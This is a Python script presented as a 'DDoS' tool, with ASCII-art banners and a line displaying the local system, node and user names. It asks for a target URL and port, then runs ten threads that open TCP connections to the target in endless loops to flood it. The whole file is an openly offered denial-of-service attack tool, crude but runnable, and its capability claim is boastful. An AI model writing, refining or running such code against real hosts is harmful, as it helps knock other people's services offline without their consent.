import socket
import requests
import time
import sys
import socket
import threading
import platform
import getpass
from colorama import Fore , init
init()
welcome_msg = print(Fore.LIGHTYELLOW_EX + """\n


        █───█ █▀▀ █── █▀▀ █▀▀█ █▀▄▀█ █▀▀ 
        █▄█▄█ █▀▀ █── █── █──█ █─▀─█ █▀▀ 
        ─▀─▀─ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀───▀ ▀▀▀        
        
            ▀▀█▀▀ █▀▀█ 
            ─░█── █──█ 
            ─░█── ▀▀▀▀

                
            ▒█▀▀█ ▒█▀▀█ ▒█▀▀█  ▒█▀▄▀█ ▒█▀▀█ ▄█░ 
            ▒█▀▀▄ ▒█▀▀▄ ▒█░▄▄  ▒█▒█▒█ ▒█░▄▄ ░█░ 
            ▒█▄▄█ ▒█▄▄█ ▒█▄▄█  ▒█░░▒█ ▒█▄▄█ ▄█▄


                            ──▄────▄▄▄▄▄▄▄────▄───
                            ─▀▀▄─▄█████████▄─▄▀▀──
                            ─────██─▀███▀─██──────
                            ───▄─▀████▀████▀─▄────
                            ─▀█────██▀█▀██────█▀──

""")
print(Fore.GREEN + " Capabilities Of This Ddos: ")
print("""
Can Send over 10,000 Packets Per 2-5 minutes. !
""")
print(Fore.RED +"")
BBG_MG1 = input("Press Enter To Start! ")
print("")
system = platform.uname()[0]
user_info = platform.system()
user_info2 = platform.node()
user_sysinfo = getpass.getuser()
print(Fore.RED + "\nYour system is: ==> ".title() +user_info)
print("Your node is: ==> ".title() +user_info2)
print("your user is: ==> ".title() +user_sysinfo)
def menu():
    print(Fore.GREEN + """


    ███╗░░░███╗░█████╗░███╗░░░███╗░█████╗░██████╗░░██████╗░░█████╗░███╗░░░███╗███████╗██████╗░░░███╗░░
    ████╗░████║██╔══██╗████╗░████║██╔══██╗██╔══██╗██╔════╝░██╔══██╗████╗░████║██╔════╝██╔══██╗░████║░░
    ██╔████╔██║███████║██╔████╔██║███████║██║░░██║██║░░██╗░███████║██╔████╔██║█████╗░░██████╔╝██╔██║░░
    ██║╚██╔╝██║██╔══██║██║╚██╔╝██║██╔══██║██║░░██║██║░░╚██╗██╔══██║██║╚██╔╝██║██╔══╝░░██╔══██╗╚═╝██║░░
    ██║░╚═╝░██║██║░░██║██║░╚═╝░██║██║░░██║██████╔╝╚██████╔╝██║░░██║██║░╚═╝░██║███████╗██║░░██║███████╗
    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝

""")
    Target_Host = input("Enter Url: ")
    time.sleep(2)
    port = int(input("Enter port: "))
    UDP_PORT = port
    time.sleep(2)
    Target_ip = socket.gethostbyname(Target_Host)
    print(Fore.RED + "\n~~~mamadgamer1 BBG MG1~~~")
    print("Target IP: ==> ", Target_ip)
    time.sleep(1)
    print("\nTarget Port: ==> ", UDP_PORT)
    print(Fore.RED + "\n~~~mamadgamer1 BBG MG1~~~")
    time.sleep(2)
    def run(k):
        while True:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((Target_Host,port))
             print(f"PACKET HAS BEEN SEND TO ==>  {Target_ip}")
    for i in range(10):
        ch = threading.Thread(target=run, args=[i])
        ch.start()
if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        print("\nYou Stopped The Ddos . . .")
        sys.exit()
